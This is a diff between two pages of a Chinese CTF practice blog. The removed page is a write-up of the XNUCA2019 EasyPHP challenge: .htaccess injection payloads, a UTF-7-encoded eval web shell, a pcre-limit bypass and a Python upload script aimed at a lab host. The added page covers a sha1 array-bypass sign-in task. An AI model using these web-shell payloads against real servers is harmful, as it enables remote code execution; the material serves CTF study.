@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="刷题笔记:[XNUCA2019Qualifier]EasyPHP, 远离尘世的幻想乡">
+    <meta name="keywords" content="刷题笔记:[极客大挑战 2020]Roamphp1-Welcome, 远离尘世的幻想乡">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>刷题笔记:[XNUCA2019Qualifier]EasyPHP | 远离尘世的幻想乡</title>
+    <title>刷题笔记:[极客大挑战 2020]Roamphp1-Welcome | 远离尘世的幻想乡</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -348,12 +348,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/38.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/72.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">刷题笔记:[XNUCA2019Qualifier]EasyPHP</h1>
+                    <h1 class="description center-align post-title">刷题笔记:[极客大挑战 2020]Roamphp1-Welcome</h1>
                 </div>
             </div>
         </div>
@@ -502,7 +502,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-08-25
+                    2021-08-26
                 </div>
                 
 
@@ -516,14 +516,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    980
+                    96
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    4 分
+                    1 分
                 </div>
                 
 
@@ -546,113 +546,28 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[htaccess|文件包含|尖括号绕过]</p>
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>打开靶机</p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-Roamphp1-Welcome/image-20210826174233449.png"></p>
+<p>还以为靶机坏了，结果是需要POST</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-    <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
-    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-                <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token punctuation">&#125;</span>
-        <span class="token punctuation">&#125;</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'POST'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"HTTP/1.1 405 Method Not Allowed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+    
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'roam1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'roam2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">&#125;</span>
-    <span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fl3g.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'roam1'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'roam2'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'roam1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'roam2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// collect information from phpinfo!</span>
     <span class="token punctuation">&#125;</span>
-    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'on'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'html'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'upload'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hacker"</span><span class="token punctuation">;</span>
-        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[^a-z\.]/"</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hacker"</span><span class="token punctuation">;</span>
-        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
-    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-                <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token punctuation">&#125;</span>
-        <span class="token punctuation">&#125;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\nJust one chance"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>一开始想着真简单啊，直接写shell，</p>
-<p>然后变成了字符串，</p>
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XNUCA2019Qualifier-EasyPHP/image-20210825220859953.png"></p>
-<h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><blockquote>
-<p>利用error_log写入log文件到<code>/tmp/fl3g.php</code>，再设置<code>include_path=/tmp</code>即可让index.php能够包含我们想要的文件。这里的报错可以通过设置<code>include_path</code>到一个不存在的文件夹即可触发包含时的报错，且include_path的值也会被输出到屏幕上。</p>
-</blockquote>
-<p>尝试上传.htaccess，但是在htaccess文件写入的时候，写入了一些混加的字符来打乱了我们的配置，可以利用注释符，以及转义，来进行绕过即<code>#\</code>，拼接完成过后就变成了<code>#\\nJust one chance</code> 不存在换行了。</p>
-<p>error_log的内容默认是<code>htmlentities</code>的,我们无法插入类似<code>&lt;?php phpinfo();?&gt;</code>的payload，尝试设置编码来绕过限制。具体见<a target="_blank" rel="noopener" href="https://github.com/mdsnins/ctf-writeups/blob/master/2019/Insomnihack%202019/l33t-hoster/l33t-hoster.md">该wp</a>，还能绕过尖括号<code>&lt;</code>.</p>
-<p>文件编码可以用notepad3或者<code>iconv 1.txt -f UTF-8 -t UTF-7 -o 2.txt</code></p>
-<blockquote>
-<p>.htaccess不支持多行注释且单行注释#必须在每行的开头</p>
-</blockquote>
-<p>所以.htaccess文件内容</p>
-<pre class="line-numbers language-none"><code class="language-none">php_value include_path &quot;&#x2F;tmp&#x2F;xx&#x2F;+ADw?php die(eval($_GET[2]))+ADs +AF8AXw-halt+AF8-compiler()+ADs&quot;
-php_value error_reporting 32767
-php_value error_log &#x2F;tmp&#x2F;fl3g.php
-# \<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>签到题，没什么好说的。</p>
+<pre class="line-numbers language-none"><code class="language-none">roam1[]&#x3D;1&amp;roam2[]&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><strong>include_path</strong>：include的路径，设置这个后，如果<code>include(fl3g.php)</code>就会尝试去包含<code>/tmp/fl3g.php</code>文件，没有则报错。</p>
-<p><strong>error_log</strong>：将php运行报错的记录写到指定文件中</p>
-<p><strong>error_reporting 32767</strong>：2767是所有常量加起来的值</p>
-<p>此时我们访问index.php就会触发error，将shell写入/tmp/fl3g.php中</p>
-<pre class="line-numbers language-none"><code class="language-none">?filename&#x3D;.htaccess&amp;content&#x3D;php_value%20include_path%20%22%2Ftmp%2Fxx%2F%2BADw%3Fphp%20die(eval(%24_GET%5B2%5D))%2BADs%20%2BAF8AXw-halt%2BAF8-compiler()%2BADs%22%0Aphp_value%20error_reporting%2032767%0Aphp_value%20error_log%20%2Ftmp%2Ffl3g.php%0A%23%20%5C<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>payload打入后，访问界面，这里按理来说应该是触发error了，但是，将报错结果写入<code>/tmp/fl3g.php</code></p>
-<p>再写入个.htaccess文件</p>
-<pre class="line-numbers language-none"><code class="language-none">php_value include_path &quot;&#x2F;tmp&quot;
-php_value zend.multibyte 1
-php_value zend.script_encoding &quot;UTF-7&quot;
-# \<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>将编码设置转为UTF-7,这样shell就能够被顺利的解析出来了。</p>
-<pre class="line-numbers language-none"><code class="language-none">?filename&#x3D;.htaccess&amp;content&#x3D;php_value%20include_path%20%22%2Ftmp%22%0Aphp_value%20zend.multibyte%201%0Aphp_value%20zend.script_encoding%20%22UTF-7%22%0A%23%20%5C<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>注意，在这里直接访问<code>/?2=phpinfo();</code>,payload里也是<code>die()</code>，目的就是为了不让代码执行到删除文件那里！！！在这里浪费了两个小时才意识到！！！！</p>
-<h3 id="非预期解1"><a href="#非预期解1" class="headerlink" title="非预期解1"></a>非预期解1</h3><p>设置pcre的一些选项可以导致文件名判断失效，从而直接写入<code>fl3g.php</code></p>
-<p>设置pcre的一些选项可以导致文件名判断失效，从而直接写入<code>fl3g.php</code></p>
-<p>大概就是<code>preg_match()</code>函数在进行正则回溯的时候(比如贪婪匹配)超过100000次后会直接返回false，在这里就把这个次数设为0，导致这个函数直接坏掉。</p>
-<pre class="line-numbers language-none"><code class="language-none">php_value pcre.backtrack_limit 0
-php_value pcre.jit 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>令filename为：</p>
-<pre class="line-numbers language-none"><code class="language-none">?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;.htaccess<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>content就能绕过stristr</p>
-<h3 id="非预期解2"><a href="#非预期解2" class="headerlink" title="非预期解2"></a>非预期解2</h3><blockquote>
-<p>注意:apache2.4.x不支持php_value</p>
-</blockquote>
-<p>换行符是<code>\n</code>,加了个<code>\</code>就变成<code>\\n</code>,就不是换行符了</p>
-<p>就被解析成这样：</p>
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XNUCA2019Qualifier-EasyPHP/image-20210825233858546.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">php_value auto_prepend_fi\
-le &quot;.htaccess&quot;
-# &lt;?php phpinfo();?&gt;\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
-
-<span class="token comment"># %23 是# 的url编码，防止python把自己注释了</span>
-<span class="token comment"># \\ ， 两个\\上传上去就是 一个 \</span>
-
-content <span class="token operator">=</span> <span class="token triple-quoted-string string">'''php_value auto_prepend_fi\\
-le ".htaccess"
-%23&lt;?php eval($_POST[cmd]);?>\\'''</span>
-
-url <span class="token operator">=</span> <span class="token string">"http://203dd3ff-f703-4233-b159-93832d5b93b3.node4.buuoj.cn:81/?filename=.htaccess&amp;content=&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>
-res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>url<span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>这篇写的很详细：</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Zero_Adam/article/details/115740087">https://blog.csdn.net/Zero_Adam/article/details/115740087</a></p>
+<p>搜下flag，结束。</p>
 
                 
             </div>
@@ -679,7 +594,7 @@ res <span class="token operator">=</span> requests<span class="token punctuation
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://syunaht.com/p/1042722407.html">https://syunaht.com/p/1042722407.html</a>
+                    <a href="https://syunaht.com/p/3383602229.html">https://syunaht.com/p/3383602229.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -772,9 +687,10 @@ res <span class="token operator">=</span> requests<span class="token punctuation
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/p/3383602229.html">
                     <div class="card-image">
@@ -792,9 +708,9 @@ res <span class="token operator">=</span> requests<span class="token punctuation
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-08-26
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-26
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -807,6 +723,7 @@ res <span class="token operator">=</span> requests<span class="token punctuation
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -833,13 +750,13 @@ res <span class="token operator">=</span> requests<span class="token punctuation
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/p/1412980291.html">
+                <a href="/p/1042722407.html">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="刷题笔记:[SUCTF 2018]annonymous">
+                        <img src="/medias/featureimages/38.jpg" class="responsive-img" alt="刷题笔记:[XNUCA2019Qualifier]EasyPHP">
                         
-                        <span class="card-title">刷题笔记:[SUCTF 2018]annonymous</span>
+                        <span class="card-title">刷题笔记:[XNUCA2019Qualifier]EasyPHP</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
